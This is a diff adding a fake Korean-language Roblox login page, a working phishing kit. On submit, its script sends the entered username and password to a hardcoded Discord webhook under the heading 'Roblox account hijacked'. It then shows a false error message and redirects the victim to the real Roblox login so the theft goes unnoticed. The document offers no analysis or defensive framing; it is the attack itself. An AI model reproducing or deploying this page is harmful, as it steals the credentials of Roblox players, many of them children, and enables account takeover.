@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Roblox</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 24px;
+            width: 92%;
+            max-width: 380px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #00bcd4;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 48px;
+            font-weight: bold;
+            color: white;
+        }
+        h1 { font-size: 22px; color: #111; margin-bottom: 4px; }
+        .sub { color: #777; font-size: 14px; margin-bottom: 28px; }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 6px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #fafafa;
+            outline: none;
+        }
+        input:focus { border-color: #00bcd4; background: #fff; }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #00bcd4;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            margin-top: 12px;
+        }
+        .err {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: 12px;
+            display: none;
+        }
+        .footer { margin-top: 20px; font-size: 11px; color: #bbb; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">R</div>
+        <h1>Roblox에 로그인</h1>
+        <p class="sub">계정에 접속하여 친구들과 함께 플레이하세요</p>
+        <form id="f">
+            <input type="text" id="u" placeholder="사용자 이름 / 이메일" required>
+            <input type="password" id="p" placeholder="비밀번호" required>
+            <button type="submit">로그인</button>
+        </form>
+        <div class="err" id="e">사용자 이름 또는 비밀번호가 올바르지 않습니다.</div>
+        <div class="footer">&copy; 2025 Roblox Corporation</div>
+    </div>
+    <script>
+        document.getElementById('f').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var u = document.getElementById('u').value;
+            var p = document.getElementById('p').value;
+            fetch('https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: '**Roblox 계정 탈취!**',
+                    embeds: [{
+                        title: '새로운 계정 정보',
+                        fields: [
+                            {name: '사용자 이름', value: u, inline: true},
+                            {name: '비밀번호', value: p, inline: true}
+                        ],
+                        color: 0x00bcd4,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(function(){});
+            document.getElementById('e').style.display = 'block';
+            setTimeout(function(){ window.location.href = 'https://www.roblox.com/login'; }, 2000);
+        });
+    </script>
+</body>
+</html>
